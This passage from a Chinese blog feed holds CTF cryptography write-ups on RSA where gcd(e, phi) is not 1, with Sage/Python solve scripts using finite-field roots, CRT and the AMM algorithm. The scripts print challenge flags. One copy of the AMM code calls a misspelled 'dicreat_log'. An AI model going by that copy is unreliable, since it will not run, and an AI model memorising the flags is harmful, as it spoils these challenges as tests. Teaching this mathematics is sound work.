class="comment">#10684338300287479543408040458978465940026825189952497034380241358187629934633982402116457227553161613428839906159238238486780629366907463456434647021345729</span></span><br><span class="line"><span class="comment">#88310577537712396844221012233266891147970635383301697208951868705047581001657402229066444746440502616020663700100248617117426072580419555633169418185262898647471677640199331807653373089977785816106098591077542771088672088382667974425747852317932746201547664979549641193108900510265622890793400796486146522028</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>gcd(e,q-1)=16  gcd(e,p-1)=2</p>
<p>m 38位，对应608个十六进制字符 304bit，而 p、q是512bit，m&lt;p、m&lt;q。</p>
<p>gcd(e,q-1)=16 ，(m^16)^((q-1)/16) ≡ c mod q </p>
<p>求(q-1)/16的逆元，c^d’  ≡ m^16 mod q </p>
<p>但是这里的 m^16直接开不出根，需要结合CRT用有限域内开根解决。</p>
<p>可以用下面这个模版，根据n分解素数的个数 适当添加缩减即可。</p>
<h4 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9794998439882070838464987778400633526071369507639213778760131552998185895297188941828281554258704149333679257014558677504899624597863467726403690826271979</span></span><br><span class="line">q = <span class="number">10684338300287479543408040458978465940026825189952497034380241358187629934633982402116457227553161613428839906159238238486780629366907463456434647021345729</span></span><br><span class="line">c = <span class="number">88310577537712396844221012233266891147970635383301697208951868705047581001657402229066444746440502616020663700100248617117426072580419555633169418185262898647471677640199331807653373089977785816106098591077542771088672088382667974425747852317932746201547664979549641193108900510265622890793400796486146522028</span></span><br><span class="line">e = <span class="number">304</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;947b6543117e32730a93d1b43c98bc57&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="unusualrsa5"><a href="#unusualrsa5" class="headerlink" title="unusualrsa5"></a>unusualrsa5</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>t=gcd(e,p-1)=gcd(e,q-1)=20</p>
<p>直接套脚本</p>
<h4 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;r54__d34l1n6_w17h_3v3n_3 _&amp;_f1nd1n6_n-7h_r0075~~&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="类型四-gcd-e-phi-很大-AMM"><a href="#类型四-gcd-e-phi-很大-AMM" class="headerlink" title="类型四  gcd(e,phi)很大 AMM"></a>类型四  gcd(e,phi)很大 AMM</h2><h3 id="AMM算法"><a href="#AMM算法" class="headerlink" title="AMM算法"></a>AMM算法</h3><p>AMM算法在RSA中适用于  phi % e == 0的情况【e | phi_n】有限域上的高次开根</p>
<p>AMM算法作用就是在有限域中开出一个根。</p>
<p>这块暂时不搞了。算法看不懂 直接找轮子。。。【想去了解可参考<a href="https://www.anquanke.com/post/id/262634#h2-5%E3%80%91">https://www.anquanke.com/post/id/262634#h2-5】</a></p>
<h4 id="NCTF2019-easyRSA"><a href="#NCTF2019-easyRSA" class="headerlink" title="[NCTF2019]easyRSA"></a>[NCTF2019]easyRSA</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.startswith(<span class="string">&#x27;NCTF&#x27;</span>))</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length() &gt; <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(p-1)%e=0  (q-1)%e=0</p>
<p>p-1 q-1均是e的倍数【即 e|p-1，e|q-1】对c开e次方根，考虑AMM算法开根号求解</p>
<h4 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c = <span class="number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"><span class="built_in">print</span> mps, mqs</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> h.decode(<span class="string">&#x27;hex&#x27;</span>).startswith(<span class="string">&#x27;NCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(h.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(solution):</span><br><span class="line">            <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br></pre></td></tr></table></figure>



<h3 id="2022MoeCTF-Signin-1"><a href="#2022MoeCTF-Signin-1" class="headerlink" title="2022MoeCTF Signin"></a>2022MoeCTF Signin</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="comment">#p= 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line"><span class="comment">#q= 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line"><span class="comment">#c= 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br></pre></td></tr></table></figure>



<h4 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">p,r</span>): </span><br><span class="line">    t=random.randint(<span class="number">2</span>,p)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(t,(p-<span class="number">1</span>)//r,p)==<span class="number">1</span>: </span><br><span class="line">         t=random.randint(<span class="number">2</span>,p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(t,(p-<span class="number">1</span>)//r,p) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">p,root,e</span>):  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g=onemod(p,e) </span><br><span class="line">        may=[] </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(e)): </span><br><span class="line">            may.append(root*<span class="built_in">pow</span>(g,i,p)%p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(may) == <span class="built_in">len</span>(<span class="built_in">set</span>(may)):</span><br><span class="line">            <span class="keyword">return</span> may</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_in_subset</span>(<span class="params">ep,p</span>):</span><br><span class="line">    cp = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,inverse(<span class="built_in">int</span>(e//ep),p-<span class="number">1</span>),p))</span><br><span class="line">    com_factors = []</span><br><span class="line">    <span class="keyword">while</span> GCD(ep,p-<span class="number">1</span>) !=<span class="number">1</span>:</span><br><span class="line">        com_factors.append(GCD(ep,p-<span class="number">1</span>))</span><br><span class="line">        ep //= GCD(ep,p-<span class="number">1</span>)</span><br><span class="line">    com_factors.sort()</span><br><span class="line"></span><br><span class="line">    cps = [cp]</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> com_factors:</span><br><span class="line">        mps = []</span><br><span class="line">        <span class="keyword">for</span> cp <span class="keyword">in</span> cps:</span><br><span class="line">            mp = AMM(cp, factor, p)</span><br><span class="line">            mps += solution(p,mp,factor)</span><br><span class="line">        cps = mps</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> cps:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">pow</span>(each,e,p)==c%p</span><br><span class="line">    <span class="keyword">return</span> cps</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p= <span class="number">12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line">q= <span class="number">12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line">c= <span class="number">68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m_p = solve_in_subset(<span class="number">1</span>,p)</span><br><span class="line">m_q = solve_in_subset(e,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> m_p:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> m_q: </span><br><span class="line">        m = crt([<span class="built_in">int</span>(mpp),<span class="built_in">int</span>(mqq)],[p,q])</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;ctf&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>在RSA中 e与phi不互素情况下，可简要概括为如下：</p>
<p>如果 gcd(e,phi) 较小时，可以考虑 iroot开根，开不出跟可考虑有限域内开跟；</p>
<p>如果 gcd(e,phi) 较大时，考虑AMM算法。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://blog.csdn.net/m0_74345946/article/details/133936371">https://blog.csdn.net/m0_74345946/article/details/133936371</a></p>
<p><a href="https://tttang.com/archive/1504/">https://tttang.com/archive/1504/</a></p>
<p><a href="https://forum.butian.net/share/1689">https://forum.butian.net/share/1689</a></p>
<p><a href="https://xz.aliyun.com/t/13917">https://xz.aliyun.com/t/13917</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>近日杂记 :)</title>
    <url>/posts/ec30fbf3/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
